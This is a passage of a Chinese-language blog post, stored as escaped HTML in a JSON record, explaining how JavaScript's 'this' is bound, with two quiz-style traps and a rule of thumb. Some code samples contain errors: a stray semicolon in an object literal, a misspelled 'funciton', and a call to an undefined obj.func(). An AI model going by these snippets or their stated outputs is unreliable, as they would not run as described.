class=\"heading\"\u003e普通函数中的this\u003c/h2\u003e\n\u003cp\u003e在调用普通函数表达式时,调用this,往往指代的是window对象。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar value=3;\nvar func=\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n  console.log(this.value);\n}\nfunc();\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如上所示，func是一个普通的指代函数的变量，在该函数中调用this，指代的是window对象。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e绑定this\u003c/h2\u003e\n\u003cp\u003e绑定this也是很常见的一种场景，call,apply,bind方法均用于绑定this到指定的对象。\u003c/p\u003e\n\u003ch1 class=\"heading\"\u003ethis常见的坑\u003c/h1\u003e\n\u003cp\u003e以上我们把this的相关场景分成了五种，但即使这样，也常常有令人迷惑的地方，下面来看下常见的两个题目：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e题目一\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar obj={\n a:3;\n getValue:\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n   \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e this.a;\n }\n}\nvar func=obj.getValue;\nconsole.log(func());\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e看到上例，可能会毫不犹豫的说答案当然是3了，很简单嘛，obj.getValue,所属对象是obj,里面的this指代的当然是obj了，返回的this.a当然就是obj.a，是3没问题，这时候，看了控制台的打印就会大吃一惊了，答案是undefined,这是因为var func=obj.getValue这一句赋值语句被忽略了，但这是至关重要的，经过这个赋值语句之后，this指代的不再是obj本身了，而是全局对象window,因为wiondow中不含有a变量，this.a当然是undefined了。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e题目二\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar obj={\n  a:4,\n  getValue:\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n    var innerfunc=\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunciton\u003c/span\u003e\u003c/span\u003e(){\n     \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e this.a;\n    }\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e innerfunc();\n  }\n}\n\nconsole.log(obj.func());\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e看到这里，可能又会脱口而出，打印出的值是4没错，这次明显就是直接调用的obj对象的func函数，this总该指向obj了吧，但是当然了，答案依然是undefined,不要忽略，getValue函数中this是经过innerfunc调用的，而innerfunc的调用对象并不是obj,所以在执行innerfunc函数时，其中的this是指代window的，a值是undefined。\u003c/p\u003e\n\u003ch1 class=\"heading\"\u003e\u003c/h1\u003e\n\u003ch2 class=\"heading\"\u003ethis和作用域\u003c/h2\u003e\n\u003cp\u003e以上的题目二之所以迷惑我们，关键的一点是，有时候不自觉得将this和作用域关联起来，因此，不要将this和作用域等同，不要自然而然的找innerfunc中的this时，会去找其包含作用域getValue的this，因为每个函数天生就有this变量，所以某个函数本身的this与其包含作用域中的this无直接关系。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e快捷判断this\u003c/h2\u003e\n\u003cp\u003e有了以上的五种场景和常见的两个this题目坑，或许可以作如下总结，this的指代值只有两种：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e指定方法的调用对象,this是调用对象\n指定方法的调用对象对象也有多种方法，向第一节提到的，直接的调用对象方法，如obj.xxx(),new构造函数中指定的调用对象为新对象，apply,call,bind方法也相当于绑定了调用对象;\u003c/li\u003e\n\u003cli\u003e调用函数表达式的值或直接调用函数表达式时,this是window\n直接调用函数表达式或其值的场景也有很多，如\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar a=\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n  \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e this.value;\n}\na();//调用函数表达式的值\n(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n  \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e this.value;\n})();//调用函数表达式\n~~\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n  \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e this.value;\n}();//调用函数表达式；\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e第一节中提到的全局作用域中的this也可以等同于在一个全局函数中调用，this,是window.\n有了以上两种判断方法就会更简单了，甚至只要区分出一种场景，就能快速判断了，如只要确定this所在的函数指定（绑定）了调用对象，this就相当于该对象，否则就是window.\u003c/p\u003e\n\u003ch1 class=\"heading\"\u003ethis这么复杂好吗\u003c/h1\u003e\n\u003cp\u003e上述的两个坑只是稍微列举了一下，实际开发中this的坑真的很多，尤其对我这种小白来说，总结发现this的这么多坑的原因往往与一个特性有关，就是this的后绑定，在看到涉及this的函数定义时，往往不自觉的在这里就给this赋值了，如上节中的坑一，正因为我看到的this所在的函数是属于一个对象的，所以未理会var func=obj.getValue，变不由得将this和obj绑定了，但这种明显是错误的，由于this的后绑定，我们不应随意在看到this时就将其赋值，而应好好分析在调用时this的所指才是正解。\n那么为什么this要后绑定呢，给我们带来了这么多坑，这应该设计到语言的设计问题了，这里无法深入，但毋庸置疑的是，js的极其重要的原型继承机制就是依赖于this后绑定的，想象一下this不是后绑定，后果很可怕。。。。\u003c/p\u003e\n","buildTime":"1515150972.9503","__v":0}
